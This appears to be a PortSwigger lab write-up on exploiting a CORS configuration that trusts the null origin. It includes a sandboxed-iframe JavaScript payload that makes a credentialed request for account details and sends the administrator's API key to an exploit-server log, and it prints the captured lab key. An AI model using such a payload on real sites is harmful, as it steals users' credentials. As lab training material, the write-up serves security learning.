![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/0d179059-af2d-4675-87df-92d295fd7fa7)

### Solution

Login to the site using credentials

once logged in we can use api key for wiener

The GET request to /accountDetails contains Access-Control-Allow-Credentials in the response.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/b352ef80-6b33-454f-b6f9-801e22fe7535)

there is no Access-Control-Allow-Origin header in response because the Origin header is not specified in the request.

If we give Origin: hacked.com in request, we can see that in the response it does not contain any Access-Control-Allow-Origin: hacked.com header. Which means hacked.com is not in the whitelisted domains.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/12a74e83-ff59-4683-a62c-2c7900dab47a)

When origin:null is given we can see that it is shown in the response

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/fa3de50d-4844-4ea3-903d-a1fcf2635622)

```js
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

This time we have the Access-Control-Allow-Origin: null header in the response. This means null is in the whitelisted domains.Some applications might whitelist the null origin to support local development of the application.

So by this we can bypass CORS & retreive the API key of administrator.Embedding script in iframe.\Scripts that originate from an iframe usually contains Origin: null.

So we need to embed our exploit script inside an iframe

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/ad4940ab-cfc8-483f-811b-54ac2010ff40)

api key is inside the access log menu

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/3aa0cee0-ce0b-4537-9493-74478abdd553)

api key `ENoZqIJ7VI1gNcZakr2dDrVN5bRNXns9`

submit the solution to solve the lab

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/7e7b4624-6522-4a19-8772-1bc5ec909fd0)
